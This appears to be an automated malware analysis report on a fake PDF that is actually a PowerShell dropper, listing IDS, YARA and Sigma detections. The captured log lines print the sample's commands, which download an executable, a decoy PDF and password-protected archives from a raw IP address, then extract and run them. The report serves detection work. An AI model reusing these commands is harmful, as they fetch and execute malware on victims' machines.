ET INFO Executable Download from dotted-quad Host
ET INFO Executable Download from dotted-quad Host
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Executable Download from dotted-quad Host"; flow:established,to_server; http.uri; content:".exe"; endswith; nocase; http.host; content:"."; offset:1; depth:3; content:"."; within:4; content:"."; within:4; pcre:"/^(?:\d{1,3}\.){3}\d{1,3}$/"; http.request_line; content:".exe HTTP/1."; fast_pattern; classtype:bad-unknown; sid:2016141; rev:9; metadata:attack_target Client_and_Server, created_at 2013_01_03, deployment Perimeter, performance_impact Significant, confidence High, signature_severity Informational, updated_at 2024_04_09;)

FILE pdf claimed, but not pdf
FILE pdf claimed, but not pdf

crowdsourced_ids_results.rule_msg: FILE pdf claimed, but not pdf

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

crowdsourced_yara_results.description: Detects suspicious PowerShell code that downloads from web sites
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

attributes.magic: ASCII text, with very long lines (1451u), with CRLF line terminators

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\system32\cmd.exe /C powershell -ExecutionPolicy Bypass -File C:\Users\<USER>\AppData\Local\Temp\ov4_dd_pf.ps1; Image=C:\Windows\system32\cmd.exe; EventID=1}

@{CommandLine=C:\Windows\system32\cmd.exe /C C:\Users\<USER>\AppData\Local\Temp\UnRAR.exe x -ppoiuytrewq1234 -o+ C:\Users\<USER>\AppData\Local\Temp\orwartde.rar C:\Users\<USER>\AppData\Local\Temp; Image=C:\Windows\system32\cmd.exe; EventID=1}

@{CommandLine=C:\Windows\system32\cmd.exe /C C:\Users\<USER>\AppData\Local\Temp\UnRAR.exe x -ppoiuytrewq1234 -o+ C:\Users\<USER>\AppData\Local\Temp\enwtsv.rar C:\Users\<USER>\AppData\Local\Temp; Image=C:\Windows\system32\cmd.exe; EventID=1}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=Invoke-WebRequest -Uri  "http://92.119.114.128/doc.pdf" -OutFile  "$env:TEMP\Distribution Document.pdf"
Start-Process -FilePath "Distribution Document.pdf" -WorkingDirectory $env:TEMP

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/UnRAR.exe" -OutFile "$env:TEMP\UnRAR.exe"

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/Base/Base64/orwartde.rar" -OutFile "$env:TEMP\orwartde.rar"
cmd.exe /C "$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP"
Start-Proc [TRUNCATED]; MessageTotal=1; ScriptBlockId=95deefc1-1f58-4a63-ba5b-d794c25df4b4; Path=C:\Users\Bruno\AppData\Local\Temp\ov4_dd_pf.ps1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Invoke-WebRequest -Uri  "http://92.119.114.128/doc.pdf" -OutFile  "$env:TEMP\Distribution Document.pdf"
Start-Process -FilePath "Distribution Document.pdf" -WorkingDirectory $env:TEMP

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/UnRAR.exe" -OutFile "$env:TEMP\UnRAR.exe"

Invoke-WebRequest -Uri "http://92.119.114.128/Assets/Base/Base64/orwartde.rar" -OutFile "$env:TEMP\orwartde.rar"
cmd.exe /C "$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP"
Start-Proc [TRUNCATED]; Path=C:\Users\Bruno\AppData\Local\Temp\ov4_dd_pf.ps1; ScriptBlockId=1c8927a8-28e7-4c38-b1c8-30354f2b3967; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description:
When C# is compiled dynamically, a .cmdline file will be created as a part of the process.
Certain processes are not typically observed compiling C# code, but can do so without touching disk.
This can be used to unpack a payload for execution

match_context.values: @{Image=C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\ejhdguqw\ejhdguqw.cmdline}
@{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Bruno\AppData\Local\Temp\q1emuzp5\q1emuzp5.cmdline; EventID=11}
@{TargetFilename=C:\Users\<USER>\AppData\Local\Temp\3pnq5ver\3pnq5ver.cmdline}

sigma_analysis_results.rule_description: Get the processes that are running on the local computer.
